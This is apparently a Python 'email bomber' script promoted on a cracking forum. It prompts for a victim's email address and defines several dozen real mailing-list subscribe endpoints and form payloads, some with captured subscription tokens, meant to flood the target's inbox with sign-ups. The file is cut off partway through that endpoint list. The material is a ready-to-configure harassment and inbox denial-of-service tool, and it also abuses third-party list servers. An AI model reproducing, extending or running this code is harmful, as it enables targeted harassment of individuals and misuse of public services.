import asyncio
import aiohttp
import re
from colorama import Fore
import os
os.system('cls')

print(Fore.RED + """

██╗  ██╗ █████╗ ██████╗ ███████╗███████╗
██║  ██║██╔══██╗██╔══██╗██╔════╝██╔════╝
███████║███████║██║  ██║█████╗  ███████╗
██╔══██║██╔══██║██║  ██║██╔══╝  ╚════██║
██║  ██║██║  ██║██████╔╝███████╗███████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝

the #1 paid email bomber! made by https://cracked.to/ANG / ANG#6166
                                        
may you destroy someone's inbox honey! 
""")

email = input('please enter the email you want to bomb: ')

class Bomber:
    def __init__(self, target):
        self.target = target
        self.parameters = {
            'Mekostaly': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/epa-info',
                'key': 'Confirmation',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'NCBI': {
                'url': 'https://mailman.mcmaster.ca/mailman/subscribe/ashs_community-l',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades1': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/epa-info',
                'key': 'Confirmation',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades2': {
                'url': 'https://mailman.mcmaster.ca/mailman/subscribe/amr_curation-l',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades3': {
                'url': 'https://mailman.mcmaster.ca/mailman/subscribe/avn-l',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades4': {
                'url': 'https://lists.osu.edu/mailman/subscribe/cbc-women-chemists',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades5': {
                'url': 'https://lists.osu.edu/mailman/subscribe/hancock-agmgrs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades6': {
                'url': 'https://lists.osu.edu/mailman/subscribe/hancock-agmgrs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades7': {
                'url': 'https://lists.osu.edu/mailman/subscribe/math-outreach',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades8': {
                'url': 'https://lists.osu.edu/mailman/subscribe/osuextension-franklincounty',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades9': {
                'url': 'https://lists.osu.edu/mailman/subscribe/uxmarketing',
                'key': 'Confirmation',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades10': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/epa-info',
                'key': 'Confirmation',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades11': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/mdk',
                'key': 'Feliratkoz\u00e1si',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades12': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/mek-osztaly',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades13': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/mekhirek',
                'key': 'Feliratkoz\u00e1s',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades14': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/mekhirek',
                'key': 'Feliratkoz\u00e1s',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades15': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/mia-l',
                'key': 'Feliratkoz\u00e1s',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades16': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/miaadm-l',
                'key': 'Feliratkoz\u00e1s',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades17': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/oszkdb',
                'key': 'deferred',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades18': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/oszkdb',
                'key': 'deferred',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades19': {
                'url': 'http://mekosztaly.oszk.hu/cgi-bin/mailman/subscribe/szaksz',
                'key': 'Confirmation',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades20': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/c-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades21': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/biosystems-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades22': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/cdd-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades23': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/cpp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades24': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/cpp-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades25': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/listinfo/cpp-cvs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades26': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/dbgap-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades27': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/dbsnp-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades28': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/dbsnp-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades29': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/dbvar-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades30': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades31': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/listinfo/forensics-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades32': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/gbench',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades33': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/gbench-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades34': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/java-study',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades35': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/linkout-news',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades36': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/medgen',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades37': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/ncbi-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades38': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/perl-study',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades39': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/pmc-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades40': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/pmc-news',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades41': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/dbvar-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades42': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/pubchem-widgets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades43': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/refseq-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades44': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/sage-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades45': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/sanity-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades46': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/software.announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades47': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/software.discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades48': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/sp_wordauthors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades49': {
                'url': 'https://www.ncbi.nlm.nih.gov/mailman/subscribe/sviewer-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades50': {
                'url': 'https://nmap.org/mailman/subscribe/dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'email-button': 'Subscribe'
                }
            },
            'Hades51': {
                'url': 'https://nmap.org/mailman/subscribe/announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'email-button': 'Subscribe'
                }
            },
            'Hades52': {
                'url': 'https://nmap.org/mailman/subscribe/fulldisclosure',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'email-button': 'Subscribe'
                }
            },
            'Hades53': {
                'url': 'https://nmap.org/mailman/subscribe/svn',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'email-button': 'Subscribe'
                }
            },
            'Hades57': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/alberta',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/alberta',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611257634::7254bd59f0f3fda9b75c290c7bddb2d5d7f9be1d',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                }
            },
            'Hades58': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/announce',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/announce',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611257661::0a23e5ebf21602bfd9c741079903186344e77cd2',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades59': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/argentina',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/argentina',
                'key': 'Dependiendo',
                'data': {
                    'sub_form_token': '1611257716::791bed47fecd054b12205563cfc295d2f6bac33f',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'language': 'es',
                    'digest': '1',
                    'email-button': 'Subscribir'
                },
            },
            'Hades60': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/atlanticcanada',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/atlanticcanada',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611257849::d3ba30c1e1baf5b7dfdab9db248aabac9c3d838d',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades61': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/barcelona',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/barcelona',
                'key': 'Depenent',
                'data': {
                    'sub_form_token': '1611257893::485389d47e817f2c0ff7481737f32e105768261f',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'language': 'ca',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades62': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/belgium',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/belgium',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611258047::7d219550c3f9c836f9a548f9618ed1e5569ec636',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades63': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/belgium-announce',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/belgium-announce',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611258149::8baaee7489f1cce705b54a6431fbe76532cceeb2',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades64': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/benchmarking',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/benchmarking',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611258198::4ccd6adec2ed33c122e369913d8b1da1d5a9b468',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades65': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/board',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/board',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611258234::3e4f13dca7b8ae50d91f5db3d889ad73b83135fa',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades66': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/board-ar',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/board-ar',
                'key': 'recibido',
                'data': {
                    'sub_form_token': '1611258377::6f80ad2f538400430355595b977b44a79d6d8164',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades67': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/board-es',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/board-es',
                'key': 'atender\u00e1',
                'data': {
                    'sub_form_token': '1611258482::94b5e0f3da241a349e851ca0a0d12233291b1603',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades68': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/board-fr',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/board-fr',
                'key': 'configuration',
                'data': {
                    'sub_form_token': '1611258682::d6501e584dae2afff97600c7af7c4425af520486',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades69': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/bolivia',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/bolivia',
                'key': 'configuraci\u00f3n',
                'data': {
                    'sub_form_token': '1611258758::9a6f091553940e2b70c1ba425379cd378089f253',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades70': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/bootcamp08',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/bootcamp08',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611258817::7c7e4c508612d452dc68bb300bbe8137492b0535',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades71': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/boston',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/boston',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611258852::a46cae1e35b9f615fe66396b352bd6e32c079cf2',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades72': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/brasil',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/brasil',
                'key': 'configura\u00e7\u00e3o',
                'data': {
                    'sub_form_token': '1611258879::faa2d24c389d67c50ea21b4a58a353c6882ddc38',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades73': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/california',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/california',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611258985::30f2cd90145d199123163fad56a1fd7b971eb39e',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades74': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/board',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/board',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611258234::3e4f13dca7b8ae50d91f5db3d889ad73b83135fa',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades75': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/can_rnf',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/can_rnf',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259031::50ecae5b73959d4e867e5642539e0a7f505235e2',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades76': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/cantabria',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/cantabria',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259097::7244c156dbb024eab0613e61fce782cac4ff7eac',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades77': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/carto',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/carto',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259137::24c0c96792d1b140f3631378f984e933602d78bf',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades78': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/cat-interop',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/cat-interop',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259171::96a4c0c8917eb9b50a54d623e9724f48303226cf',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades79': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/cbers-pds',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/cbers-pds',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259197::e19a3997ab209391f17a02b4cb8daf98309fd598',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades80': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/coc',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/coc',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259230::509c1c111f8199c2f61ddc6b54098d13fe118cc1',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades81': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/coc-discuss',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/coc-discuss',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259265::4990eba74149a6ab39e388055f0e5e4507557271',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades82': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/cog',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/cog',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259309::e4629dbc3e4ede25d24b8f3312be9b7adb4843fe',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades83': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/conference-europe',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/conference-europe',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259992::fb23c8fb65cf50522c9223c69f0ebe7c0ddb6e76',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades84': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/cog',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/cog',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611259309::e4629dbc3e4ede25d24b8f3312be9b7adb4843fe',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades85': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/conference-workshops',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/conference-workshops',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260132::78559ea17a51c0c1760d3b0b568eb13e93d95e76',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades86': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/conference_dev',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/conference_dev',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260180::d34d33e7d19fffa60da045b69ccd8c5a9a39612b',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades87': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/contractors',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/contractors',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260217::11285cd653ff0a699244b9587909317e7269467b',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades88': {
